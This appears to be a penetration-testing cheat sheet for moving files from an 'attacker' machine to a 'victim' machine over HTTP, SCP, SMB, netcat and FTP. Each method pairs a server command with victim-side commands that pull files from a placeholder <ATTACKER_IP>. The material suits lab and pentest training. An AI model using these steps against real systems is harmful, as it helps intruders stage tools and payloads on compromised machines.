
## 1. HTTP Method (Simplest for any OS)

_Best for: Quick transfers, one-time use._

### Attacker (Sender)

Bash

```
# Python 3
python3 -m http.server 80

# Or using PHP
php -S 0.0.0.0:80
```

### Victim (Receiver)

```
Linux `wget http://<ATTACKER_IP>/filename  
curl -O http://<ATTACKER_IP>/filename
    
Windows (PowerShell) iwr -uri http://<ATTACKER_IP>/filename -OutFile filename
wget http://ip/filename -o filename
curl http://ip/filename -O filename
    
```

## 2. SCP / SSH Method

_Best for: Encrypted and secure transfers._

### Attacker (Sender)

```
# Push file to victim
scp /path/to/local/file username@<VICTIM_IP>:/tmp/
```

### Victim (Receiver)

_(Victim ko bas SSH service on karni hogi: `sudo systemctl start ssh`)_

## 3. SMB Method (Windows/Linux)

_Best for: Transferring between Linux and Windows seamlessly._

### Attacker (Sender - Hosting SMB)

_Install impacket for quick SMB server:_

Bash

```
impacket-smbserver shareName /path/to/folder -smb2support
```

### Victim (Receiver - Mounting SMB)

```
- **Linux:** mount -t cifs //<ATTACKER_IP>/shareName /mnt -o username=guest,password=guest
    
- **Windows:** net use Z: \\<ATTACKER_IP>\shareName
    
```
## 4. Netcat (The "Raw" Way)

_Best for: When no other tools are allowed or available._

### Attacker (Sender)


```
# Prepare the file to be sent
nc -lvnp 1234 < file_to_send
```

### Victim (Receiver)

Bash

```
# Connect and pull the file
nc <ATTACKER_IP> 1234 > received_file
```

## 5. FTP Method

_Best for: Large files or legacy systems._

### Attacker (Sender)

_Setup an FTP server using python or pure-ftpd._

Bash

```
# Simple Python FTP server
sudo python3 -m pyftpdlib -p 21
```

### Victim (Receiver)

```
Linux ftp <ATTACKER_IP> -> get filename
    
Windows ftp <ATTACKER_IP> ->  get filename
```